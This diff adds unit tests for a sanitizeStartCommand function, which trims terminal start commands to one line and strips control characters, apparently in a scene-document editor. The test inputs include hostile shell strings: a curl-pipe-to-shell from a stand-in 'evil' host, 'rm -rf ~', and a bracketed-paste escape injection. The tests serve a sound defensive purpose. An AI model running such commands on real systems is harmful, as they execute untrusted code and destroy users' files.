@@ -4,6 +4,7 @@ import {
   parseSceneTerminal,
   resolveSceneTerminal,
   type SceneDocTerminal,
+  sanitizeStartCommand,
   sceneTerminalLayout,
   TERMINAL_CELL_HEIGHT_EM,
   TERMINAL_CELL_WIDTH_EM,
@@ -85,6 +86,42 @@ describe("parseSceneTerminal", () => {
     const dropped = parseSceneDoc({ version: 1, terminal: 7 }, "test");
     warn.mockRestore();
     expect(dropped?.terminal).toBeUndefined();
+  });
+});
+
+describe("sanitizeStartCommand (never auto-runs)", () => {
+  it("passes a plain single-line command through, spaces intact", () => {
+    expect(sanitizeStartCommand("pnpm test --filter x")).toBe("pnpm test --filter x");
+  });
+
+  it("keeps only the first line, so a newline can't reach the shell as Enter", () => {
+    expect(sanitizeStartCommand("curl http://evil/x | sh\nrm -rf ~")).toBe(
+      "curl http://evil/x | sh",
+    );
+    expect(sanitizeStartCommand("echo hi\n")).toBe("echo hi");
+    expect(sanitizeStartCommand("echo one\r\necho two")).toBe("echo one");
+  });
+
+  it("strips control and format chars, including the bracketed-paste terminator's ESC", () => {
+    const command = sanitizeStartCommand("ls\u001b[201~; rm -rf ~");
+    expect(command).toBe("ls[201~; rm -rf ~");
+    expect(sanitizeStartCommand("\u0003\u0004echo hi")).toBe("echo hi");
+  });
+
+  it("collapses to empty when nothing runnable survives", () => {
+    expect(sanitizeStartCommand("\n\n")).toBe("");
+    expect(sanitizeStartCommand("   ")).toBe("");
+  });
+});
+
+describe("parseSceneTerminal start command", () => {
+  it("stores the sanitised first line and drops a command that empties out", () => {
+    expect(parseSceneTerminal({ startCommand: "deploy\nrm -rf ~" }, "test")).toEqual({
+      startCommand: "deploy",
+    });
+    const warn = vi.spyOn(console, "warn").mockImplementation(() => {});
+    expect(parseSceneTerminal({ startCommand: "\n" }, "test")).toEqual({});
+    warn.mockRestore();
   });
 });
 
